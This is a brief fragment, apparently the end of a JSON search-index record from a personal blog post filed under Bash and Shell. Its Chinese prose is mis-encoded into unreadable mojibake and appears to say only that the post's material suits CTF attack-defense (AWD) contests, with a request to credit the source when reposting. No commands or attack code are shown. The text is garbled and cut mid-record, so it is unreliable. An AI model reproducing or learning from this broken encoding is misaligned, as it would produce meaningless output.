è¿™äº›éƒ½å¯ä»¥æ‹¿åˆ°ä¸€äº›æ”»é˜²æ¯”èµ› å¦‚: CTFçš„AWD æˆ–è€…ä¸€äº› æŠ€èƒ½å¤§èµ› è½¬è½½è¯·æ ‡æ˜å‡ºå¤„","categories":[{"name":"Bash","slug":"Bash","permalink":"https://hu5k7.github.io/categories/Bash/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hu5k7.github.io/tags/Shell/"}]}]}